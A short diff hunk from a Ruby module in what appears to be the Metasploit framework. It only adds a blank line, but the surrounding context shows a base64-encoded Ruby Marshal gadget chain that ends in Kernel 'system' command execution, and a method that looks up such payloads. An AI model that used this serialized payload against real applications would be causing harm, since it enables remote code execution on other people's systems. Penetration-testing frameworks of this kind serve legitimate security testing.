@@ -17,6 +17,7 @@ module Msf
           'bytes' => 'BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIhlTR1Y1WkdWeVFXNWtjbUZrWlNBZwY6BkVUOhJAZGVidWdfb3V0cHV0bzoWTmV0OjpXcml0ZUFkYXB0ZXIHOgxAc29ja2V0bzoUR2VtOjpSZXF1ZXN0U2V0BzoKQHNldHNvOw4HOw9tC0tlcm5lbDoPQG1ldGhvZF9pZDoLc3lzdGVtOg1AZ2l0X3NldEkiBQY7DFQ7EjoMcmVzb2x2ZQ=='
         }
       }.freeze
+      
       def self.payload(payload_name, command = nil)
         payload = PAYLOADS[payload_name]
 
